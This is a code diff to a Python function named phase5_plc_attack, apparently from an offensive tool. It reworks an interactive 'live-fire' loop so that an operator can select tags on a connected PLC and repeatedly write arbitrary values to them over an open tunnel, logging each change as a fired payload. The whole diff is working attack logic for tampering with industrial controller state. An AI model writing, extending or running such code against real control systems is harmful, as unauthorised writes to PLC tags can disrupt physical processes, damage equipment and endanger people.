@@ -1220,65 +1220,76 @@ def phase5_plc_attack() -> PhaseResult:
                     tbl.add_row(str(i), _tname(t), _ttype(t))
                 console.print(tbl)
 
-            # ── Live-fire loop — tunnel + connection stay open throughout ──────
+            # ── Live-fire shell — tunnel + connection stay open throughout ─────
             payloads_fired: list[str] = []
 
-            while True:
-                _render_tag_table()
-
-                # ── Index-based tag selection ─────────────────────────────────
-                console.print()
-                raw_idx = Prompt.ask(
-                    f"[yellow]Select tag by number (1–{len(display_tags)})[/yellow]"
-                )
+            def _cast(raw: str, reference):
+                """Cast raw string to the same type as reference value."""
                 try:
-                    idx = int(raw_idx.strip()) - 1
+                    if isinstance(reference, float): return float(raw)
+                    if isinstance(reference, int):   return int(raw)
+                except ValueError:
+                    pass
+                return raw
+
+            quit_all = False
+
+            # ── OUTER LOOP: tag selection ─────────────────────────────────────
+            while not quit_all:
+                _render_tag_table()
+                console.print(
+                    f"[dim]  Select a tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
+                )
+                console.print()
+                raw_idx = Prompt.ask("[yellow]Tag #[/yellow]").strip().lower()
+
+                if raw_idx in ("q", "quit"):
+                    quit_all = True
+                    break
+
+                try:
+                    idx = int(raw_idx) - 1
                     if not (0 <= idx < len(display_tags)):
                         raise ValueError
                     tag = _tname(display_tags[idx])
                 except ValueError:
-                    warn("Invalid selection — try again")
+                    warn("Invalid selection — enter a number from the table or 'q' to quit")
                     continue
 
                 CFG["plc"]["tag"] = tag
 
-                # ── Read current value ────────────────────────────────────────
-                cur_result = plc_conn.read(tag)
-                cur_val    = cur_result.value if cur_result else "unknown"
-                ok(f"Current value of [bold]{tag}[/bold]: [bold yellow]{cur_val}[/bold yellow]")
+                # ── INNER LOOP: continuous injection on same tag ──────────────
+                while not quit_all:
+                    cur_res = plc_conn.read(tag)
+                    cur_val = cur_res.value if cur_res else "unknown"
 
-                # ── Prompt for injection value ────────────────────────────────
-                console.print()
-                raw_val = Prompt.ask(
-                    f"[red]Enter value to inject into [bold]{tag}[/bold] "
-                    f"(current: [bold yellow]{cur_val}[/bold yellow])[/red]"
-                )
-                try:
-                    # Cast to same type as current value when possible
-                    if isinstance(cur_val, float):
-                        inject_val = float(raw_val)
-                    elif isinstance(cur_val, int):
-                        inject_val = int(raw_val)
-                    else:
-                        inject_val = raw_val
-                except ValueError:
-                    inject_val = raw_val
+                    console.print()
+                    console.print(
+                        f"[dim]  [bold]back[/bold] / [bold]b[/bold] = change tag  |  "
+                        f"[bold]q[/bold] = quit[/dim]"
+                    )
+                    raw_val = Prompt.ask(
+                        f"[red]  {tag}[/red] "
+                        f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim] "
+                        f"[red]→ new value[/red]"
+                    ).strip().lower()
 
-                # ── Fire ──────────────────────────────────────────────────────
-                before = plc_conn.read(tag)
-                info(f"Before : {tag} = {before.value}")
+                    if raw_val in ("q", "quit"):
+                        quit_all = True
+                        break
 
-                plc_conn.write((tag, inject_val))
+                    if raw_val in ("b", "back"):
+                        break   # return to outer tag-selection loop
 
-                after = plc_conn.read(tag)
-                ok(f"After  : [bold]{tag}[/bold] = [bold green]{after.value}[/bold green]")
+                    inject_val = _cast(raw_val, cur_val)
 
-                payloads_fired.append(f"{tag}: {before.value} → {after.value}")
+                    before = plc_conn.read(tag)
+                    plc_conn.write((tag, inject_val))
+                    after  = plc_conn.read(tag)
 
-                # ── Deploy another? ───────────────────────────────────────────
-                console.print()
-                if not Confirm.ask("[red]Deploy another payload?[/red]", default=False):
-                    break
+                    info(f"  Before : {before.value}")
+                    ok(f"  After  : [bold green]{after.value}[/bold green]")
+                    payloads_fired.append(f"{tag}: {before.value} → {after.value}")
 
         finally:
             plc_conn.close()
